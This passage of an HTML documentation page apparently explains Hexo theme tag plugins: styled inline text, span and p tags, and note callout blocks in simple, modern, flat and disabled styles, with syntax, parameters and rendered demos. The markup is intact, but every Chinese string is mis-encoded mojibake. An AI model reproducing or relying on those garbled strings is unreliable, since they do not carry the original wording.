class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><ol><li>å¸¦ <u>ä¸‹åˆ’çº¿</u> çš„æ–‡æœ¬</li><li>å¸¦ <emp>ç€é‡å·</emp> çš„æ–‡æœ¬</li><li>å¸¦ <wavy>æ³¢æµªçº¿</wavy> çš„æ–‡æœ¬</li><li>å¸¦ <del>åˆ é™¤çº¿</del> çš„æ–‡æœ¬</li><li>é”®ç›˜æ ·å¼çš„æ–‡æœ¬ <kbd>command</kbd> + <kbd>D</kbd></li><li>å¯†ç æ ·å¼çš„æ–‡æœ¬ï¼š<psw>è¿™é‡Œæ²¡æœ‰éªŒè¯ç </psw></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-2-è¡Œå†…æ–‡æœ¬-span">2.2 è¡Œå†…æ–‡æœ¬ span</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% span æ ·å¼å‚æ•°(å‚æ•°ä»¥ç©ºæ ¼åˆ’åˆ†), æ–‡æœ¬å†…å®¹ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>å­—ä½“</code>: logo, code</li><li><code>é¢œè‰²</code>: red,yellow,green,cyan,blue,gray</li><li><code>å¤§å°</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>å¯¹é½æ–¹å‘</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> å½©è‰²æ–‡å­—</span><br><span class="line">åœ¨ä¸€æ®µè¯ä¸­æ–¹ä¾¿æ’å…¥å„ç§é¢œè‰²çš„æ ‡ç­¾ï¼ŒåŒ…æ‹¬ï¼š&#123;% span red, çº¢è‰² %&#125;ã€&#123;% span yellow, é»„è‰² %&#125;ã€&#123;% span green, ç»¿è‰² %&#125;ã€&#123;% span cyan, é’è‰² %&#125;ã€&#123;% span blue, è“è‰² %&#125;ã€&#123;% span gray, ç°è‰² %&#125;ã€‚</span><br><span class="line"><span class="bullet">-</span> è¶…å¤§å·æ–‡å­—</span><br><span class="line">æ–‡æ¡£ã€Œå¼€å§‹ã€é¡µé¢ä¸­çš„æ ‡é¢˜éƒ¨åˆ†å°±æ˜¯è¶…å¤§å·æ–‡å­—ã€‚</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><ul><li>å½©è‰²æ–‡å­—<br>åœ¨ä¸€æ®µè¯ä¸­æ–¹ä¾¿æ’å…¥å„ç§é¢œè‰²çš„æ ‡ç­¾ï¼ŒåŒ…æ‹¬ï¼š<span class='p red'>çº¢è‰²</span>ã€<span class='p yellow'>é»„è‰²</span>ã€<span class='p green'>ç»¿è‰²</span>ã€<span class='p cyan'>é’è‰²</span>ã€<span class='p blue'>è“è‰²</span>ã€<span class='p gray'>ç°è‰²</span>ã€‚</li><li>è¶…å¤§å·æ–‡å­—<br>æ–‡æ¡£ã€Œå¼€å§‹ã€é¡µé¢ä¸­çš„æ ‡é¢˜éƒ¨åˆ†å°±æ˜¯è¶…å¤§å·æ–‡å­—ã€‚<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-æ®µè½æ–‡æœ¬-p">2.3 æ®µè½æ–‡æœ¬ p</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p æ ·å¼å‚æ•°(å‚æ•°ä»¥ç©ºæ ¼åˆ’åˆ†), æ–‡æœ¬å†…å®¹ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>å­—ä½“</code>: logo, code</li><li><code>é¢œè‰²</code>: red,yellow,green,cyan,blue,gray</li><li><code>å¤§å°</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>å¯¹é½æ–¹å‘</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> å½©è‰²æ–‡å­—</span><br><span class="line">åœ¨ä¸€æ®µè¯ä¸­æ–¹ä¾¿æ’å…¥å„ç§é¢œè‰²çš„æ ‡ç­¾ï¼ŒåŒ…æ‹¬ï¼š&#123;% p red, çº¢è‰² %&#125;ã€&#123;% p yellow, é»„è‰² %&#125;ã€&#123;% p green, ç»¿è‰² %&#125;ã€&#123;% p cyan, é’è‰² %&#125;ã€&#123;% p blue, è“è‰² %&#125;ã€&#123;% p gray, ç°è‰² %&#125;ã€‚</span><br><span class="line"><span class="bullet">-</span> è¶…å¤§å·æ–‡å­—</span><br><span class="line">æ–‡æ¡£ã€Œå¼€å§‹ã€é¡µé¢ä¸­çš„æ ‡é¢˜éƒ¨åˆ†å°±æ˜¯è¶…å¤§å·æ–‡å­—ã€‚</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><ul><li>å½©è‰²æ–‡å­—<br>åœ¨ä¸€æ®µè¯ä¸­æ–¹ä¾¿æ’å…¥å„ç§é¢œè‰²çš„æ ‡ç­¾ï¼ŒåŒ…æ‹¬ï¼š<p class='p red'>çº¢è‰²</p>ã€<p class='p yellow'>é»„è‰²</p>ã€<p class='p green'>ç»¿è‰²</p>ã€<p class='p cyan'>é’è‰²</p>ã€<p class='p blue'>è“è‰²</p>ã€<p class='p gray'>ç°è‰²</p>ã€‚</li><li>è¶…å¤§å·æ–‡å­—<br>æ–‡æ¡£ã€Œå¼€å§‹ã€é¡µé¢ä¸­çš„æ ‡é¢˜éƒ¨åˆ†å°±æ˜¯è¶…å¤§å·æ–‡å­—ã€‚</li></ul><p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-å¼•ç”¨note">2.4 å¼•ç”¨note</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">é€šç”¨é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">è¯­æ³•æ ¼å¼</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -5">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># è‡ªå¸¦icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># å¤–éƒ¨icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.è‡ªå¸¦icon</p><table><thead><tr><th>å‚æ•°</th><th style="text-align:center">ç”¨æ³•</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">ã€å¯é€‰ã€‘æ ‡è¯†ï¼Œä¸åŒçš„æ ‡è¯†æœ‰ä¸åŒçš„é…è‰² ï¼ˆ default / primary / success / info / warning / danger ï¼‰</td></tr><tr><td>no-icon</td><td style="text-align:center">ã€å¯é€‰ã€‘ä¸æ˜¾ç¤º icon</td></tr><tr><td>style</td><td style="text-align:center">ã€å¯é€‰ã€‘å¯ä»¥è¦†ç›–é…ç½®ä¸­çš„ style ï¼ˆsimple/modern/flat/disabledï¼‰</td></tr></tbody></table><p>2.å¤–éƒ¨icon</p><table><thead><tr><th>å‚æ•°</th><th style="text-align:center">ç”¨æ³•</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">ã€å¯é€‰ã€‘æ ‡è¯†ï¼Œä¸åŒçš„æ ‡è¯†æœ‰ä¸åŒçš„é…è‰² ï¼ˆ default / blue / pink / red / purple / orange / green ï¼‰</td></tr><tr><td>no-icon</td><td style="text-align:center">ã€å¯é€‰ã€‘å¯é…ç½®è‡ªå®šä¹‰ icon (åªæ”¯æŒ fontawesome å›¾æ ‡, ä¹Ÿå¯ä»¥é…ç½® no-icon )</td></tr><tr><td>style</td><td style="text-align:center">ã€å¯é€‰ã€‘å¯ä»¥è¦†ç›–é…ç½®ä¸­çš„ style ï¼ˆsimple/modern/flat/disabledï¼‰</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><details class="folding-tag" blue><summary> 1.è‡ªå¸¦icon </summary>              <div class='content'>              <p>1.<code>simple</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;é»˜è®¤ æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;é»˜è®¤ æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;é»˜è®¤ æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;é»˜è®¤ æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;é»˜è®¤ æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger æç¤ºå—æ ‡ç­¾&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.å¤–éƒ¨icon </summary>              <div class='content'>              <p>1.<code>simple</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021å¹´å¿«åˆ°äº†....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;å‰ªåˆ€çŸ³å¤´å¸ƒ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021å¹´å¿«åˆ°äº†....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;å‰ªåˆ€çŸ³å¤´å¸ƒ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021å¹´å¿«åˆ°äº†....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;å‰ªåˆ€çŸ³å¤´å¸ƒ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021å¹´å¿«åˆ°äº†....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;å‰ªåˆ€çŸ³å¤´å¸ƒ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>æ ·å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021å¹´å¿«åˆ°äº†....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;å‰ªåˆ€çŸ³å¤´å¸ƒ&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -5"><details class="folding-tag" blue><summary> 1.è‡ªå¸¦icon </summary>              <div class='content'>              <p>1.<code>simple</code>æ ·å¼</p><div class="note simple"><p>é»˜è®¤ æç¤ºå—æ ‡ç­¾</p></div><div class="note default simple"><p>default æç¤ºå—æ ‡ç­¾</p></div><div class="note primary simple"><p>primary æç¤ºå—æ ‡ç­¾</p></div><div class="note success simple"><p>success æç¤ºå—æ ‡ç­¾</p></div><div class="note info simple"><p>info æç¤ºå—æ ‡ç­¾</p></div><div class="note warning simple"><p>warning æç¤ºå—æ ‡ç­¾</p></div><div class="note danger simple"><p>danger æç¤ºå—æ ‡ç­¾</p></div>2.`modern`æ ·å¼<div class="note modern"><p>é»˜è®¤ æç¤ºå—æ ‡ç­¾</p></div><div class="note default modern"><p>default æç¤ºå—æ ‡ç­¾</p></div><div class="note primary 